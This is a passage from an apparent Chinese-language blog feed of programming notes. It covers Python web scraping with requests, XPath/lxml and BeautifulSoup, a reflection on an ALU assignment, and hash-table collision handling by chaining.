Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;171.14.209.180:27829&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url,headers=headers,proxies=proxy)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xx.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.text)</span><br></pre></td></tr></table></figure><h2 id="cookie："><a class="header-anchor" href="#cookie：">¶</a>cookie：</h2><p>如果在一个响应中包含了<code>cookie</code>，那么可以利用<code>cookies</code>属性拿到这个返回的<code>cookie</code>值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies.get_dict())</span><br></pre></td></tr></table></figure><h2 id="session："><a class="header-anchor" href="#session：">¶</a>session：</h2><p>之前使用<code>urllib</code>库，是可以使用<code>opener</code>发送多个请求，多个请求之间是可以共享<code>cookie</code>的。那么如果使用<code>requests</code>，也要达到共享<code>cookie</code>的目的，那么可以使用<code>requests</code>库给我们提供的<code>session</code>对象。注意，这里的<code>session</code>不是web开发中的那个session，这个地方只是一个会话的对象而已。还是以登录人人网为例，使用<code>requests</code>来实现。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问大鹏个人中心</span></span><br><span class="line">resp = session.get(<span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><h2 id="处理不信任的SSL证书："><a class="header-anchor" href="#处理不信任的SSL证书：">¶</a>处理不信任的SSL证书：</h2><p>对于那些已经被信任的SSL证书的网站，比如<code>https://www.baidu.com/</code>，那么使用<code>requests</code>直接就可以正常的返回响应。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.get(<span class="string">&#x27;http://www.12306.cn/mormhweb/&#x27;</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1>XPath语法和lxml模块</h1><h2 id="什么是XPath？"><a class="header-anchor" href="#什么是XPath？">¶</a>什么是XPath？</h2><p>xpath（XML Path Language）是一门在XML和HTML文档中查找信息的语言，可用来在XML和HTML文档中对元素和属性进行遍历。</p><h2 id="XPath语法"><a class="header-anchor" href="#XPath语法">¶</a>XPath语法</h2><h3 id="选取节点："><a class="header-anchor" href="#选取节点：">¶</a>选取节点：</h3><p>XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。</p><table><thead><tr><th>表达式</th><th>描述</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>nodename</td><td>选取此节点的所有子节点</td><td>bookstore</td><td>选取bookstore下所有的子节点</td></tr><tr><td>/</td><td>如果是在最前面，代表从根节点选取。否则选择某节点下的某个节点</td><td>/bookstore</td><td>选取根元素下所有的bookstore节点</td></tr><tr><td>//</td><td>从全局节点中选择节点，随便在哪个位置</td><td>//book</td><td>从全局节点中找到所有的book节点</td></tr><tr><td>@</td><td>选取某个节点的属性</td><td>//book[@price]</td><td>选择所有拥有price属性的book节点</td></tr><tr><td>.</td><td>当前节点</td><td>./a</td><td>选取当前节点下的a标签</td></tr></tbody></table><h3 id="谓语："><a class="header-anchor" href="#谓语：">¶</a>谓语：</h3><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点，被嵌在方括号中。<br>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>描述</th></tr></thead><tbody><tr><td>/bookstore/book[1]</td><td>选取bookstore下的第一个子元素</td></tr><tr><td>/bookstore/book[last()]</td><td>选取bookstore下的倒数第二个book元素。</td></tr><tr><td>bookstore/book[position()&lt;3]</td><td>选取bookstore下前面两个子元素。</td></tr><tr><td>//book[@price]</td><td>选取拥有price属性的book元素</td></tr><tr><td>//book[@price=10]</td><td>选取所有属性price等于10的book元素</td></tr></tbody></table><h3 id="通配符"><a class="header-anchor" href="#通配符">¶</a>通配符</h3><p>*表示通配符。</p><table><thead><tr><th style="text-align:left">通配符</th><th style="text-align:left">描述</th><th style="text-align:left">示例</th><th style="text-align:left">结果</th></tr></thead><tbody><tr><td style="text-align:left">*</td><td style="text-align:left">匹配任意节点</td><td style="text-align:left">/bookstore/*</td><td style="text-align:left">选取bookstore下的所有子元素。</td></tr><tr><td style="text-align:left">@*</td><td style="text-align:left">匹配节点中的任何属性</td><td style="text-align:left">//book[@*]</td><td style="text-align:left">选取所有带有属性的book元素。</td></tr></tbody></table><h3 id="选取多个路径："><a class="header-anchor" href="#选取多个路径：">¶</a>选取多个路径：</h3><p>通过在路径表达式中使用“|”运算符，可以选取若干个路径。<br>示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//bookstore/book | //book/title</span><br><span class="line"># 选取所有book元素以及book元素下所有的title元素</span><br></pre></td></tr></table></figure><h2 id="lxml库"><a class="header-anchor" href="#lxml库">¶</a>lxml库</h2><p>lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。</p><p>lxml和正则一样，也是用 C 实现的，是一款高性能的 Python HTML/XML 解析器，我们可以利用之前学习的XPath语法，来快速的定位特定元素以及节点信息。</p><p>需要安装C语言库，可使用 pip 安装：<code>pip install lxml</code></p><h3 id="基本使用："><a class="header-anchor" href="#基本使用：">¶</a>基本使用：</h3><p>我们可以利用他来解析HTML代码，并且在解析HTML代码的时候，如果HTML代码不规范，他会自动的进行补全。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 lxml 的 etree 库</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree </span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt; # 注意，此处缺少一个 &lt;/li&gt; 闭合标签</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用etree.HTML，将字符串解析为HTML文档</span></span><br><span class="line">html = etree.HTML(text) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 按字符串序列化HTML文档</span></span><br><span class="line">result = etree.tostring(html) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>输入结果如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到。lxml会自动修改HTML代码。例子中不仅补全了li标签，还添加了body，html标签。</p><h3 id="从文件中读取html代码："><a class="header-anchor" href="#从文件中读取html代码：">¶</a>从文件中读取html代码：</h3><p>除了直接使用字符串进行解析，lxml还支持从文件中读取内容。我们新建一个hello.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hello.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后利用<code>etree.parse()</code>方法来读取文件。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取外部文件 hello.html</span></span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = etree.tostring(html, pretty_print=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>输入结果和之前是相同的。</p><h3 id="在lxml中使用XPath语法："><a class="header-anchor" href="#在lxml中使用XPath语法：">¶</a>在lxml中使用XPath语法：</h3><ol><li><p>获取所有li标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(html)  <span class="comment"># 显示etree.parse() 返回类型</span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 打印&lt;li&gt;标签的元素集合</span></span><br></pre></td></tr></table></figure></li><li><p>获取所有li元素下的所有class属性的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下href为<code>www.baidu.com</code>的a标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a[@href=&quot;www.baidu.com&quot;]&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下所有span标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment">#result = html.xpath(&#x27;//li/span&#x27;)</span></span><br><span class="line"><span class="comment">#注意这么写是不对的：</span></span><br><span class="line"><span class="comment">#因为 / 是用来获取子元素的，而 &lt;span&gt; 并不是 &lt;li&gt; 的子元素，所以，要用双斜杠</span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li//span&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下的a标签里的所有class：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a//@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取最后一个li的a的href属性对应的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()]/a/@href&#x27;</span>)</span><br><span class="line"><span class="comment"># 谓语 [last()] 可以找到最后一个元素</span></span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取倒数第二个li元素的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># text 方法可以获取元素内容</span></span><br><span class="line"><span class="built_in">print</span>(result[<span class="number">0</span>].text)</span><br></pre></td></tr></table></figure></li><li><p>获取倒数第二个li元素的内容的第二种方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a/text()&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ol><h2 id="BeautifulSoup4库"><a class="header-anchor" href="#BeautifulSoup4库">¶</a>BeautifulSoup4库</h2><p>使用流程：</p><ol><li>根据标签名进行获取节点</li><li>获取文本内容和属性</li></ol><h3 id="属性"><a class="header-anchor" href="#属性">¶</a>属性</h3><blockquote><p>soup.a.attrs   返回一字典，里面是所有属性和值<br>soup.a[‘href’] 获取href属性</p></blockquote><h3 id="文本"><a class="header-anchor" href="#文本">¶</a>文本</h3><blockquote><p><strong>soup.a.string</strong><br><strong>soup.a.text</strong><br><strong>soup.a.get_text()</strong><br>【注】当标签里面还有标签的时候，string获取的为None，其他两个获取纯文本内容</p></blockquote><h4 id="find方法"><a class="header-anchor" href="#find方法">¶</a>find方法</h4><blockquote><p><strong>soup.find(‘a’)</strong><br><strong>soup.find(‘a’, class_=‘xxx’)</strong><br><strong>soup.find(‘a’, title=‘xxx’)</strong><br><strong>soup.find(‘a’, id=‘xxx’)</strong><br><strong>soup.find(‘a’, id=re.compile(r’xxx’))</strong><br>【注】find只能找到符合要求的第一个标签，他返回的是一个对象</p></blockquote><h3 id="find-all方法"><a class="header-anchor" href="#find-all方法">¶</a>find_all方法</h3><blockquote><p>返回一个列表，列表里面是所有的符合要求的对象<br><strong>soup.find_all(‘a’)</strong><br><strong>soup.find_all(‘a’, class_=‘wang’)</strong><br><strong>soup.find_all(‘a’, id=re.compile(r’xxx’))</strong><br><strong>soup.find_all(‘a’, limit=2)</strong>   提取出前两个符合要求的a</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Crawler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ALU Reflection</title>
      <link href="/2021/10/15/ALU%20Reflection/"/>
      <url>/2021/10/15/ALU%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1>ALU Reflection</h1><h2 id="一、-实现过程中的bug"><a class="header-anchor" href="#一、-实现过程中的bug">¶</a>一、 实现过程中的bug</h2><ol><li>char 与 int 的转换老是忘记……</li><li>减法参数传反了（主要是顺序不符合正常逻辑</li><li>字符串相等用 equals</li></ol><h2 id="二、-反思"><a class="header-anchor" href="#二、-反思">¶</a>二、 反思</h2><ol><li>代码没有经过充分的测试前，都是错误的，在后面调用前面未测试的模块只会增加调试的麻烦。</li><li>多使用assert尽早发现问题</li><li>左移右移用的蛮多的，应该抽象为函数，重复了好多次</li></ol><h2 id="三、-收获"><a class="header-anchor" href="#三、-收获">¶</a>三、 收获</h2><ol><li><p>恢复除法存在的bug，即被除数为负与除数恰好相加为0是，被判定为异号不够除，但实际是够的。<br>解决方法：可以到最后调整余数与商。</p></li><li><p>自己写测试用例，将int最大最小值，0，正负相乘等边界情况做测试，也可以写random</p></li><li><p>char数组转String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.valueOf (Arrays.copyOfRange (arr, i, j))</span><br><span class="line">String.valueOf (Arrays.copyOf (arr, Length))</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希</title>
      <link href="/2021/09/03/%E5%93%88%E5%B8%8C/"/>
      <url>/2021/09/03/%E5%93%88%E5%B8%8C/</url>
      
        <content type="html"><![CDATA[<h1>哈希</h1><p>哈希表就是集查找、插入和删除于一身的一种数据结构（算法题里一般只有插入和删除操作）。哈希的过程就是把一个大的数据范围映射到一个较小的数据范围内的过程，这一点跟离散化很像，可以把<strong>离散化</strong>看成极其特殊的哈希方式。</p><p>因为数据量很大，哈希表难免会出现碰撞，就是把两个不一样的数映射成一样的数，key1 ！= key2 ，hash（key1） == hash（key2）这种情况，所以我们要避免冲突。</p><h2 id="处理冲突的方法"><a class="header-anchor" href="#处理冲突的方法">¶</a>处理冲突的方法</h2><p>以下题为例：</p><blockquote><p>维护一个集合，支持如下几种操作：</p><p>I x，插入一个数 x（−10<sup>9</sup> ≤ x ≤ 10<sup>9</sup>）；<br>Q x，询问数 x 是否在集合中出现过；<br>现在要进行 N （1 ≤ N ≤ 10<sup>5</sup>）次操作，对于每个询问操作输出对应的结果。</p><p>输入格式<br>第一行包含整数 N，表示操作数量。</p><p>接下来 N 行，每行包含一个操作指令，操作指令为 I x，Q x 中的一种。</p><p>输出格式<br>对于每个询问指令 Q x，输出一个询问结果，如果 x 在集合中出现过，则输出Yes，否则输出 No。</p></blockquote><h3 id="1-拉链法——数组与链表的结合"><a class="header-anchor" href="#1-拉链法——数组与链表的结合">¶</a>1.拉链法——数组与链表的结合</h3><p>假设我们刚开始将11映射到3的位置上，我们就在3的位置处拉出一个链，将11加进去；倘若第二次映射，23也映射到了3的位置，我们就继续把23加进去。这种处理冲突的方法就是拉链法。</p><p><img src="https://i.loli.net/2021/09/03/XE91BtfRzTClrLZ.png" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">    Link link = <span class="keyword">new</span> <span class="built_in">Link</span>(data);</span><br><span class="line">    <span class="keyword">int</span> key = link.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in">insert</span>(link);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Link <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">return</span> array[hashVal].<span class="built_in">find</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">   